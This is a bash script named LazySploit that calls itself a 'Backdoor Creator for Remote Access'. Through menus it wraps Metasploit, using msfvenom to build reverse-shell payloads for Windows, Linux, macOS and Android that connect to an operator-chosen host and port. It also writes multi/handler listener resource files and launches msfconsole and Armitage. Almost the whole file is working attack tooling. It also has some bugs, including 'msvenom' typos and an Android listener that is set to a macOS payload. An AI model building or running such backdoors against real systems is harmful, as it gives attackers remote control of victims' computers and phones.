#!/bin/bash

#Colour
cyan='\e[0;36m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
purple='\e[1;35m'

[[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
resize -s 30 85
mkdir ~/Desktop/temp
clear
echo -e $green"Starting Services......."
service postgresql start
service apache2 start
clear 
echo -e $red":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e $red"::::::::::::::::::::::::::::$blue Metasploit service started $red:::::::::::::::::::::::::::::"
echo -e $red":::::::::::::::::::$green Scripts and payloads saved to ~/Desktop/temp/ $red:::::::::::::::::::"
echo -e $red":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
read -p "Press [Enter] key to Continue..."
clear  
echo -e "                       ▌   ▞▀▖ ▀▀▌ ▌ ▌ ▞▀▖ ▛▀▖ ▌   ▞▀▖ ▜▘ ▀▛▘"
echo -e "                       ▌   ▙▄▌  ▞  ▝▞  ▚▄  ▙▄▘ ▌   ▌ ▌ ▐   ▌ "
echo -e "                       ▌   ▌ ▌ ▞    ▌  ▖ ▌ ▌   ▌   ▌ ▌ ▐   ▌ "
echo -e "                       ▀▀▘ ▘ ▘ ▀▀▘  ▘  ▝▀  ▘   ▀▀▘ ▝▀  ▀▘  ▘ "
echo -e 
echo -e "                $white[$lightgreen--$white]    $white Backdoor Creator for Remote Access     $white[$lightgreen--$white] "
echo -e "                $white[$lightgreen--$white]         $cyan Created by:$red Soumen Khara          $white[$lightgreen--$white] "
echo -e "                $white[$lightgreen--$white]       $cyan Follow me on Github:$red @50UM3N        $white[$lightgreen--$white]"
echo -e "                $white[$lightgreen--$white]         $white SELECT AN OPTION TO BEGIN         $white[$lightgreen--$white]"
tput sgr0 
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "    $lightgreen[$red"1"$lightgreen] $lightgreen Payload      $white [Create a payload with msvenom] "
tput sgr0                               
echo -e "    $lightgreen[$red"2"$lightgreen] $lightgreen Listen       $white [Start a multi handler] "
tput sgr0
echo -e "    $lightgreen[$red"3"$lightgreen] $lightgreen Exploit      $white [Start Msfconsole] "
tput sgr0
echo -e "    $lightgreen[$red"4"$lightgreen] $lightgreen Armitage     $white [Start Armitage GUI] "
echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─[$cyan"menu"$lightgreen]:"	
echo -ne $lightgreen"└─────► " ;tput sgr0

read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
clear
echo -e $lightgreen"  ===================================================================== "
echo -e " |  $cyan  Create Payload with msfvenom ( must install msfvenom )  $ligitgreen         | "
echo -e $lightgreen"  ===================================================================== "
echo -e $red"  ___________ "
echo -e " |           |======[***   $yellow    ____                _             "
echo -e $red" | $yellow MSFVENOM $red \ 	     $yellow / ___|_ __ ___  ____| |_ ___  _ __ "
echo -e $red" |_____________\_______    $yellow  | |   | '__/ _ \/ _  | __/ _ \| '__|"
echo -e $red" |==[     >]===========\   $yellow  | |___| | |  __/ (_| | || (_) | |   "
echo -e $red" |______________________\  $yellow   \____|_|  \___|\____|\__\___/|_|    "
echo -e $yellow"  \(@)(@)(@)(@)(@)(@)(@)/ "
echo -e $red"  *********************  "
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "    $lightgreen[$red"1"$lightgreen] $lightgreen Windows      $white [laxysploit.exe] "
tput sgr0                               # Reset colors to "normal."
echo -e "    $lightgreen[$red"2"$lightgreen] $lightgreen Linux        $white [lazysploit.elf] "
tput sgr0
echo -e "    $lightgreen[$red"3"$lightgreen] $lightgreen Mac          $white [lazysploit.macho] "
tput sgr0
echo -e "    $lightgreen[$red"4"$lightgreen] $lightgreen Android      $white [lazysploit.apk]"
tput sgr0
echo -e "    $lightgreen[$red"5"$lightgreen] $lightgreen List_All     $white [Start MSFConsole] "
tput sgr0
echo -e "    $lightgreen[$red"6"$lightgreen] $lightgreen Quit         $white [Exit The Tool] "
echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─["$cyan"msfvenom$lightgreen]:"	
echo -ne $lightgreen"└─────► " ;tput sgr0

read options

    case "$options" in
       "1" | "1" )
clear
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue __        ___           _                    $lightgreen[]"
echo -e $lightgreen"[] $blue \ \      / (_)_ __   __| | _____      _____  $lightgreen[]"
echo -e $lightgreen"[] $blue  \ \ /\ / /| | '_ \ / _| |/ _ \ \ /\ / / __| $lightgreen[]"
echo -e $lightgreen"[] $blue   \ V  V / | | | | | (_| | (_) \ V  V /\__ \ $lightgreen[]"
echo -e $lightgreen"[] $blue    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/ $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Payload for WINDOWS           $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
echo -e $blue ""                                            
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "$yellow:::::$red shell.exe saved to ~/Desktop/temp$yellow:::::"
            ;;
       "2" | "2" )
clear
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue  _     _                                     $lightgreen[]"
echo -e $lightgreen"[] $blue | |   (_)_ __  _   ___  __                   $lightgreen[]"
echo -e $lightgreen"[] $blue | |   | | '_ \| | | \ \/ /                   $lightgreen[]"
echo -e $lightgreen"[] $blue | |___| | | | | |_| |>  <                    $lightgreen[]"
echo -e $lightgreen"[] $blue |_____|_|_| |_|\__,_/_/\_\                   $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Payload for LINUX             $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
echo -e $blue "" 
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "$yellow:::::$red shell.elf saved to ~/Desktop/temp$yellow:::::"
            ;;
       "3" | "3" )
clear
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue  __  __                                      $lightgreen[]"
echo -e $lightgreen"[] $blue |  \/  | __ _  ___                           $lightgreen[]"
echo -e $lightgreen"[] $blue | |\/| |/ _' |/ __|                          $lightgreen[]"
echo -e $lightgreen"[] $blue | |  | | (_| | (__                           $lightgreen[]"
echo -e $lightgreen"[] $blue |_|  |_|\__,_|\___|                          $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Payload for  MAC              $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
echo -e $blue "" 
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "$yellow:::::$red shell.macho saved to ~/Desktop/temp$yellow:::::"
            ;;
       "4" | "4" )
clear
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue     _              _           _     _       $lightgreen[]"
echo -e $lightgreen"[] $blue    / \   _ __   __| |_ __ ___ (_) __| |      $lightgreen[]"
echo -e $lightgreen"[] $blue   / _ \ | '_ \ / _' | '__/ _ \| |/ _' |      $lightgreen[]"
echo -e $lightgreen"[] $blue  / ___ \| | | | (_| | | | (_) | | (_| |      $lightgreen[]"
echo -e $lightgreen"[] $blue /_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|      $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Payload for  ANDROID          $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
echo -e $blue "" 
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "$yellow:::::$red shell.apk saved to ~/Desktop/temp$yellow:::::"
            ;;  
       "5" | "5" )
            xterm -e msvenom -l &
            ;;  
       "6" | "6" )
            echo "Good Bye" && break 
            ;;
        *) echo invalid option;;
    esac
;;

  "2" | "2" )
clear
echo -e $lightgreen"[]==============================================[]"
echo -e $lightgreen"[] $blue  _     ___ ____ _____ _   _ _____ ____      $lightgreen[]"
echo -e $lightgreen"[] $blue | |   |_ _/ ___|_   _| \ | | ____|  _ \     $lightgreen[]"
echo -e $lightgreen"[] $blue | |    | |\___ \ | | |  \| |  _| | |_) |    $lightgreen[]"
echo -e $lightgreen"[] $blue | |___ | | ___) || | | |\  | |___|  _ <     $lightgreen[]"
echo -e $lightgreen"[] $blue |_____|___|____/ |_| |_| \_|_____|_| \_\    $lightgreen[]"
echo -e $lightgreen"[]                                              []"
echo -e $lightgreen"[]==============================================[]"
echo -e $lightgreen"[]   $red Lets Craft a Listner for Exploit          $lightgreen[]"
echo -e $lightgreen"[]==============================================[]"
PS3='┌─[SOUMEN]─[creator]
└─────► '
echo -e $blue""
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
clear
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue __        ___           _                    $lightgreen[]"
echo -e $lightgreen"[] $blue \ \      / (_)_ __   __| | _____      _____  $lightgreen[]"
echo -e $lightgreen"[] $blue  \ \ /\ / /| | '_ \ / _| |/ _ \ \ /\ / / __| $lightgreen[]"
echo -e $lightgreen"[] $blue   \ V  V / | | | | | (_| | (_) \ V  V /\__ \ $lightgreen[]"
echo -e $lightgreen"[] $blue    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/ $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Listner for WINDOWS           $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
echo -e $blue ""                                             

            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
            ;;
        "Linux")
clear
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue  _     _                                     $lightgreen[]"
echo -e $lightgreen"[] $blue | |   (_)_ __  _   ___  __                   $lightgreen[]"
echo -e $lightgreen"[] $blue | |   | | '_ \| | | \ \/ /                   $lightgreen[]"
echo -e $lightgreen"[] $blue | |___| | | | | |_| |>  <                    $lightgreen[]"
echo -e $lightgreen"[] $blue |_____|_|_| |_|\__,_/_/\_\                   $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Listner for LINUX             $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
echo -e $blue "" 
            touch ~/Desktop/temp/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_linux.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_linux.rc
            cat ~/Desktop/temp/meterpreter_linux.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_linux.rc &
            exit
            ;;
        "Mac")
clear
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue  __  __                                      $lightgreen[]"
echo -e $lightgreen"[] $blue |  \/  | __ _  ___                           $lightgreen[]"
echo -e $lightgreen"[] $blue | |\/| |/ _' |/ __|                          $lightgreen[]"
echo -e $lightgreen"[] $blue | |  | | (_| | (__                           $lightgreen[]"
echo -e $lightgreen"[] $blue |_|  |_|\__,_|\___|                          $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Listner for  MAC              $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
echo -e $blue "" 
            touch ~/Desktop/temp/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_mac.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_mac.rc
            cat ~/Desktop/temp/meterpreter_mac.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_mac.rc &
            ;;
        "Android")
clear
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue     _              _           _     _       $lightgreen[]"
echo -e $lightgreen"[] $blue    / \   _ __   __| |_ __ ___ (_) __| |      $lightgreen[]"
echo -e $lightgreen"[] $blue   / _ \ | '_ \ / _' | '__/ _ \| |/ _' |      $lightgreen[]"
echo -e $lightgreen"[] $blue  / ___ \| | | | (_| | | | (_) | | (_| |      $lightgreen[]"
echo -e $lightgreen"[] $blue /_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|      $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Listner for  ANDROID          $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
echo -e $blue "" 
            touch ~/Desktop/temp/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_droid.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_droid.rc
            cat ~/Desktop/temp/meterpreter_droid.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
            ;;  
        "List_All")
            touch ~/Desktop/temp/payloads.rc
            echo show payloads > ~/Desktop/temp/payloads.rc
            cat ~/Desktop/temp/payloads.rc
            xterm -e msfconsole -r ~/Desktop/temp/payloads.rc &
            ;;   
        "Quit")
               echo "Good Bye" && break 
            ;;
        *) echo invalid option;;
    esac
done
;;

 "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "$red::::::::::::::::::::::::::::::::$white Starting Metasploit $red:::::::::::::::::::::::::::::::"
  msfconsole
  use exploit/multi/handler  

;;

  "4" | "4" )
  # 
  echo -e "$red::::::::::::::::::::::::::::::::$white Armitage Launching $red:::::::::::::::::::::::::::::::"
  echo "armitage should be in /opt/armitage"
  echo -e "$red::::::::::::::::::::::::::::::::::: $white Launching... $red:::::::::::::::::::::::::::::::::::"
  xterm -e sudo java -jar /opt/armitage/armitage.jar & 

;;

          * )
   # Default option.      
   # 
   echo
   echo "Not yet in database."
  ;;

esac

tput sgr0                               # Reset colors to "normal."

echo

exit 0
